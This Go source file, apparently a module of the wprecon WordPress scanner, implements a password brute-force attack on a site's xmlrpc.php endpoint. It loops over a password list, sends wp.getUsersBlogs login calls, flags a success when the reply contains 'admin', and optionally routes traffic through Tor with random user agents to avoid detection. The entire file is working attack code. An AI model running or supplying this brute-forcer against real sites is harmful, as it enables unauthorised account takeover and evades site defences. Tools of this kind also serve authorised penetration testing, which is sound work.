package fuzzing

import (
	"fmt"
	"strings"

	. "github.com/blackbinn/wprecon/cli/config"
	"github.com/blackbinn/wprecon/pkg/gohttp"
	"github.com/blackbinn/wprecon/pkg/printer"
)

func XMLRPC(channel chan [2]int, username string, passwords []string) {
	http := gohttp.NewHTTPClient()
	http.SetMethod("POST")
	http.SetURL(Database.Target)
	http.SetURLDirectory("xmlrpc.php")
	http.OnTor(Database.OtherInformationsBool["http.options.tor"])
	http.OnRandomUserAgent(Database.OtherInformationsBool["http.options.randomuseragent"])
	http.OnTLSCertificateVerify(Database.OtherInformationsBool["http.options.tlscertificateverify"])
	http.FirewallDetection(true)

	for count, password := range passwords {
		http.SetData(fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, password))

		response, err := http.Run()

		if err != nil {
			printer.Danger(fmt.Sprintf("%s", err))
		}

		if containsAdmin := strings.Contains(strings.ToLower(response.Raw), "admin"); containsAdmin {
			channel <- [2]int{1, count}
			break
		} else if 1+count == len(passwords) {
			channel <- [2]int{0, count}
			break
		} else {
			channel <- [2]int{0, count}
		}
	}
}
